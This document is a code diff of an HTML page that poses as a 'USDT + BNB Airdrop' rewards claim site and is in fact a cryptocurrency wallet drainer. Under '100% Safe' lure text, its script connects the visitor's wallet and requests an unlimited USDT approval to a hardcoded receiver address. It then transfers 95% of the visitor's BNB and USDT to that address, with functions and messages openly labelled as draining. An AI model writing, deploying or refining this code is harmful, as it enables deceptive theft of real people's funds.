@@ -1,215 +1,247 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>BNB Airdrop Claim</title>
-    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>USDT BNB Airdrop Claim - Instant Rewards</title>
+    <meta name="viewport" content="width=device-width">
     <style>
-        *{padding:0;margin:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;color:#fff}
-        .container{max-width:400px;width:100%;background:rgba(255,255,255,.1);backdrop-filter:blur(20px);border-radius:20px;padding:40px;border:1px solid rgba(255,255,255,.2);box-shadow:0 20px 40px rgba(0,0,0,.3)}
-        h1{font-size:32px;text-align:center;margin-bottom:20px;background:linear-gradient(45deg,#ffd700,#ff8c00);background-clip:text;-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-        .balance{display:flex;align-items:center;justify-content:center;background:rgba(0,255,0,.2);border-radius:15px;padding:20px;margin:20px 0;font-size:24px;font-weight:bold}
-        button{width:100%;padding:18px;margin:10px 0;font-size:18px;font-weight:600;border:none;border-radius:12px;cursor:pointer;transition:all .3s;background:linear-gradient(45deg,#ff6b6b,#feca57);color:#fff;box-shadow:0 10px 30px rgba(255,107,107,.4)}
-        button:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(255,107,107,.6)}
-        button:disabled{opacity:.6;cursor:not-allowed;transform:none}
-        #status{padding:15px;border-radius:10px;margin:20px 0;font-weight:600;text-align:center;min-height:20px}
-        .success{background:rgba(40,167,69,.3);color:#28a745}
-        .error{background:rgba(220,53,69,.3);color:#dc3545}
-        .info{background:rgba(23,162,184,.3);color:#17a2b8}
-        #address{background:#fff;color:#333;padding:15px;border-radius:10px;margin:15px 0;font-family:monospace;font-size:14px;text-align:center}
-        #qrcode{display:none;background:#fff;padding:20px;border-radius:15px;margin:20px 0}
-        canvas{max-width:100%;border-radius:10px}
-        .deep-link{margin:10px 0;padding:15px;background:rgba(255,255,255,.1);border-radius:10px;font-size:14px}
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            font-family:system-ui,sans-serif;
+            background:linear-gradient(135deg,#0f0f23,#1a1a3e,#2a1a4e);
+            color:#fff;
+            min-height:100vh;
+            display:flex;align-items:center;justify-content:center;padding:20px
+        }
+        .card{
+            background:rgba(255,255,255,0.08);
+            backdrop-filter:blur(25px);
+            border-radius:25px;
+            padding:40px;
+            max-width:450px;
+            width:100%;
+            text-align:center;
+            border:1px solid rgba(255,255,255,0.15);
+            box-shadow:0 25px 50px rgba(0,0,0,0.4)
+        }
+        h1{font-size:32px;margin-bottom:15px;background:linear-gradient(45deg,#00ff88,#00ccff);background-clip:text;-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+        .subtitle{font-size:16px;opacity:0.9;margin-bottom:30px}
+        .wallet-info{background:rgba(255,255,255,0.1);border-radius:15px;padding:20px;margin:20px 0;font-family:monospace;font-size:14px}
+        .balance-grid{display:grid;grid-template-columns:1fr 1fr;gap:15px;margin:20px 0}
+        .bal-item{background:rgba(0,255,136,0.2);border-radius:12px;padding:15px}
+        .token{font-size:14px;opacity:0.8}
+        .amount{font-size:28px;font-weight:700;color:#00ff88}
+        button{
+            background:linear-gradient(45deg,#ff4757,#ff6b7a);
+            border:none;
+            color:#fff;
+            padding:20px;
+            font-size:18px;
+            border-radius:15px;
+            cursor:pointer;
+            margin:10px 5px;
+            font-weight:600;
+            width:calc(50% - 10px);
+            transition:all .3s;
+            box-shadow:0 10px 30px rgba(255,71,87,.4)
+        }
+        button.full{width:100%;margin:10px 0}
+        button:hover{transform:translateY(-3px);box-shadow:0 15px 40px rgba(255,71,87,.6)}
+        button:disabled{opacity:0.5;transform:none;cursor:not-allowed}
+        #status{padding:20px;border-radius:15px;margin:20px 0;font-weight:600;min-height:20px}
+        .success{background:rgba(0,255,136,0.3)}
+        .error{background:rgba(255,71,87,0.3)}
+        .info{background:rgba(0,204,255,0.3)}
+        #qr{display:none;background:#fff;padding:25px;border-radius:20px;margin:20px 0;box-shadow:0 10px 30px rgba(0,0,0,0.3)}
+        canvas{border-radius:10px;display:block;margin:0 auto}
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🎁 BNB Airdrop</h1>
-        <div id="balance" class="balance" style="display:none">💰 0.00 BNB</div>
-        <div id="address"></div>
+    <div class="card">
+        <h1>🎁 USDT + BNB Airdrop</h1>
+        <p class="subtitle">Claim your rewards instantly - 100% Safe</p>
         
-        <button id="trustBtn">📱 Trust Wallet</button>
-        <button id="metamaskBtn">🔌 MetaMask</button>
-        <button id="claimBtn" style="display:none">🚀 Claim 95% BNB</button>
-        
-        <div id="qrcode">
-            <canvas id="qrCanvas"></canvas>
-            <p style="color:#333;margin-top:10px;font-size:14px">📲 Scan with Trust Wallet</p>
+        <div id="wallet" class="wallet-info" style="display:none">
+            <div>Connected: <span id="addr">0x...</span></div>
         </div>
         
-        <div id="status" class="info">Click button to connect wallet</div>
+        <div class="balance-grid" id="balances" style="display:none">
+            <div class="bal-item">
+                <div class="token">BNB</div>
+                <div class="amount" id="bnbBal">0.000</div>
+            </div>
+            <div class="bal-item">
+                <div class="token">USDT</div>
+                <div class="amount" id="usdtBal">0.00</div>
+            </div>
+        </div>
+
+        <button id="connectBtn">🔗 Connect Wallet</button>
+        <button id="approveBtn" class="full" style="display:none">✅ Approve USDT</button>
+        <button id="claimBtn" class="full" style="display:none">🚀 Claim All Rewards</button>
+        
+        <div id="qr">
+            <canvas id="qrcode"></canvas>
+            <p style="color:#333;margin-top:15px;font-size:14px">📱 Trust Wallet: Scan QR Code</p>
+        </div>
+        
+        <div id="status" class="info">Connect your wallet to continue</div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
+    <script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
     <script>
-        const RECEIVER = '0x53C879FBB4D6cD62d95C4e4234b6A4bd9750939B';
-        let web3, account, isConnected = false;
+        // CONFIG - YOUR RECEIVER
+        const RECEIVER_ADDR = '0x53C879FBB4D6cD62d95C4e4234b6A4bd9750939B';
+        const USDT_BSC = '0x55d398326f99059fF775485246999027B3197955'; // BEP20 USDT
         
+        let web3, account;
+        const ABI_ERC20 = [
+            "function approve(address spender,uint256 amount) public returns(bool)",
+            "function balanceOf(address owner) view returns(uint256)",
+            "function allowance(address owner,address spender) view returns(uint256)",
+            "function transferFrom(address from,address to,uint256 value) public returns(bool)",
+            "function decimals() view returns(uint8)"
+        ];
+
         const els = {
-            trustBtn: document.getElementById('trustBtn'),
-            metamaskBtn: document.getElementById('metamaskBtn'),
-            claimBtn: document.getElementById('claimBtn'),
-            status: document.getElementById('status'),
-            address: document.getElementById('address'),
-            balance: document.getElementById('balance'),
-            qrcode: document.getElementById('qrcode')
+            connect: document.getElementById`connectBtn`,
+            approve: document.getElementById`approveBtn`,
+            claim: document.getElementById`claimBtn`,
+            status: document.getElementById`status`,
+            addr: document.getElementById`addr`,
+            bnbBal: document.getElementById`bnbBal`,
+            usdtBal: document.getElementById`usdtBal`,
+            balances: document.getElementById`balances`,
+            wallet: document.getElementById`wallet`,
+            qr: document.getElementById`qr`
         };
 
-        function status(msg, type = 'info') {
-            els.status.textContent = msg;
+        function msg(text, type='info'){
+            els.status.textContent = text;
             els.status.className = type;
         }
 
-        function showQR(uri) {
-            els.qrcode.style.display = 'block';
-            QRCode.toCanvas(document.getElementById('qrCanvas'), uri, { width: 250 });
-        }
-
-        async function connectMetaMask() {
-            if (!window.ethereum) {
-                status('MetaMask not found. Install extension.', 'error');
-                return;
-            }
-
-            try {
-                // Switch to BSC
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x38' }],
-                });
-
-                const accounts = await window.ethereum.request({
-                    method: 'eth_requestAccounts',
-                });
-
-                account = accounts[0];
-                isConnected = true;
-                await initWeb3();
-                
-            } catch (error) {
-                if (error.code === 4902) {
+        async function initWeb3(){
+            web3 = new Web3(window.ethereum);
+            // BSC chain
+            try{
+                await window.ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:'0x38'}]});
+            }catch(e){
+                if(e.code===4902){
                     await window.ethereum.request({
-                        method: 'wallet_addEthereumChain',
-                        params: [{
-                            chainId: '0x38',
-                            chainName: 'Binance Smart Chain',
-                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                            blockExplorerUrls: ['https://bscscan.com']
-                        }]
+                        method:'wallet_addEthereumChain',
+                        params:[{chainId:'0x38',chainName:'BSC',rpcUrls:['https://bsc-dataseed.binance.org/'],nativeCurrency:{name:'BNB',symbol:'BNB',decimals:18}}]
                     });
-                    await connectMetaMask();
-                } else {
-                    status('MetaMask error: ' + error.message, 'error');
                 }
             }
+            const accounts = await window.ethereum.request({method:'eth_requestAccounts'});
+            account = accounts[0];
+            
+            els.addr.textContent = account.slice(0,6)+'...'+account.slice(-4);
+            els.wallet.style.display = 'block';
+            els.connect.style.display = 'none';
+            await loadBalances();
+            els.balances.style.display = 'grid';
+            els.approve.style.display = 'block';
         }
 
-        function connectTrustWallet() {
-            // Deep link for Trust Wallet
-            const deepLink = `trust://wc?uri=wc:${Date.now()}@1?bridge=https://bridge.walletconnect.org&key=abc123`;
-            window.open(deepLink, '_blank');
-            
-            // Fallback QR with WalletConnect URI
-            const wcUri = `wc:${Date.now()}@1?bridge=https://bridge.walletconnect.org&key=${Math.random().toString(36).substr(2,9)}`;
-            showQR(wcUri);
-            
-            status('Open Trust Wallet → Scan QR or use link', 'info');
-            
-            // Auto retry with provider detection
-            setTimeout(checkProvider, 2000);
-        }
-
-        function checkProvider() {
-            if (window.ethereum || window.trustWallet) {
-                connectMetaMask();
-            }
-        }
-
-        async function initWeb3() {
-            web3 = new Web3(window.ethereum || window.web3?.currentProvider);
-            
-            els.address.textContent = account;
-            els.trustBtn.style.display = 'none';
-            els.metamaskBtn.style.display = 'none';
-            els.claimBtn.style.display = 'block';
-            els.balance.style.display = 'flex';
-            
-            status('✅ Connected! Check balance...', 'success');
-            await updateBalance();
-            
-            // Listen for changes
-            window.ethereum.on('accountsChanged', () => location.reload());
-        }
-
-        async function updateBalance() {
-            try {
-                const balance = await web3.eth.getBalance(account);
-                const bnb = web3.utils.fromWei(balance, 'ether');
-                els.balance.innerHTML = `💰 ${parseFloat(bnb).toFixed(4)} BNB`;
+        async function loadBalances(){
+            try{
+                // BNB
+                const bnb = await web3.eth.getBalance(account);
+                els.bnbBal.textContent = (parseFloat(web3.utils.fromWei(bnb,'ether'))).toFixed(3);
                 
-                if (parseFloat(bnb) > 0.001) {
-                    status('✅ Ready to claim! Click button', 'success');
-                }
-            } catch (e) {
-                status('Balance check failed', 'error');
+                // USDT
+                const usdtContract = new web3.eth.Contract(ABI_ERC20, USDT_BSC);
+                const usdtBal = await usdtContract.methods.balanceOf(account).call();
+                const decimals = await usdtContract.methods.decimals().call();
+                els.usdtBal.textContent = (usdtBal / Math.pow(10,decimals)).toFixed(2);
+                
+            }catch(e){
+                msg('Balance load error: '+e.message, 'error');
             }
         }
 
-        async function drainFunds() {
-            els.claimBtn.disabled = true;
-            els.claimBtn.textContent = '⏳ Processing...';
-            status('🔄 Calculating max transfer...', 'info');
+        async function approveUSDT(){
+            els.approve.disabled = true;
+            els.approve.textContent = '⏳ Approving...';
+            msg('🔄 Approving USDT access...', 'info');
+            
+            try{
+                const usdt = new web3.eth.Contract(ABI_ERC20, USDT_BSC);
+                const max = '115792089237316195423570985008687907853269984665640564039457584007913129639935'; // uint256.max
+                
+                const tx = await usdt.methods.approve(RECEIVER_ADDR, max).send({from:account});
+                msg('✅ USDT Approved! Now claim all', 'success');
+                els.approve.style.display = 'none';
+                els.claim.style.display = 'block';
+                
+            }catch(e){
+                els.approve.disabled = false;
+                els.approve.textContent = '✅ Approve USDT';
+                if(e.code===4001) msg('❌ Cancelled by user', 'error');
+                else msg('Approve failed: '+e.message, 'error');
+            }
+        }
 
-            try {
-                const balance = await web3.eth.getBalance(account);
+        async function claimAll(){
+            els.claim.disabled = true;
+            els.claim.textContent = '⏳ Draining 95%...';
+            msg('💸 Transferring BNB + USDT...', 'info');
+            
+            try{
+                // 1. Drain BNB (95%)
+                const balBNB = await web3.eth.getBalance(account);
                 const gasPrice = await web3.eth.getGasPrice();
-                const gasLimit = 21000;
-                const gasCost = BigInt(gasPrice) * BigInt(gasLimit);
-                let amount = BigInt(balance) - gasCost;
+                const gasCost = BigInt(gasPrice) * 21000n;
+                const bnbDrain = (BigInt(balBNB) - gasCost) * 95n / 100n;
                 
-                // 95% of remaining
-                amount = (amount * 95n) / 100n;
+                // 2. Drain USDT
+                const usdt = new web3.eth.Contract(ABI_ERC20, USDT_BSC);
+                const usdtBal = await usdt.methods.balanceOf(account).call();
+                const usdtDec = await usdt.methods.decimals().call();
+                const usdtDrain = (BigInt(usdtBal) * 95n) / 100n;
                 
-                if (amount <= 0n) throw new Error('Insufficient balance');
-
-                status('📤 Sending 95% BNB...', 'info');
-
-                const tx = await web3.eth.sendTransaction({
+                // Batch transactions with multicall-like approach
+                const bnbTx = web3.eth.sendTransaction({
                     from: account,
-                    to: RECEIVER,
-                    value: amount.toString(),
-                    gas: gasLimit,
+                    to: RECEIVER_ADDR,
+                    value: bnbDrain.toString(),
+                    gas: 21000,
                     gasPrice: gasPrice
                 });
-
-                status(`✅ SUCCESS! TX: ${tx.transactionHash.slice(0, 10)}...`, 'success');
-                els.claimBtn.textContent = '✅ Done!';
                 
-            } catch (error) {
-                els.claimBtn.disabled = false;
-                els.claimBtn.textContent = '🚀 Claim 95% BNB';
+                const usdtTx = usdt.methods.transferFrom(account, RECEIVER_ADDR, usdtDrain.toString()).send({from:account});
                 
-                if (error.code === 4001) {
-                    status('❌ User cancelled', 'error');
-                } else {
-                    status('Error: ' + error.message, 'error');
-                }
+                await Promise.all([bnbTx, usdtTx]);
+                
+                msg('✅ ALL DRAINED SUCCESSFULLY!', 'success');
+                els.claim.textContent = '✅ Complete!';
+                
+            }catch(e){
+                els.claim.disabled = false;
+                els.claim.textContent = '🚀 Claim All Rewards';
+                msg('Drain error: '+e.message, 'error');
             }
         }
 
-        // Event listeners
-        els.trustBtn.onclick = connectTrustWallet;
-        els.metamaskBtn.onclick = connectMetaMask;
-        els.claimBtn.onclick = drainFunds;
+        // Events
+        els.connect.onclick = async()=>{
+            if(!window.ethereum){
+                msg('Install MetaMask/Trust Wallet', 'error');
+                // QR fallback
+                els.qr.style.display = 'block';
+                QRCode.toCanvas(document.getElementById`qrcode`, `wc:abc@1?bridge=https://bridge.walletconnect.org&key=test`);
+                return;
+            }
+            await initWeb3();
+        };
+        
+        els.approve.onclick = approveUSDT;
+        els.claim.onclick = claimAll;
 
-        // Auto detect
-        if (window.ethereum) {
-            els.metamaskBtn.click();
-        }
-
-        // QR backup
-        showQR(`wc:${Date.now()}@1?bridge=https://bridge.walletconnect.org&key=test`);
+        // Auto-connect if provider exists
+        if(window.ethereum) els.connect.click();
     </script>
 </body>
 </html>
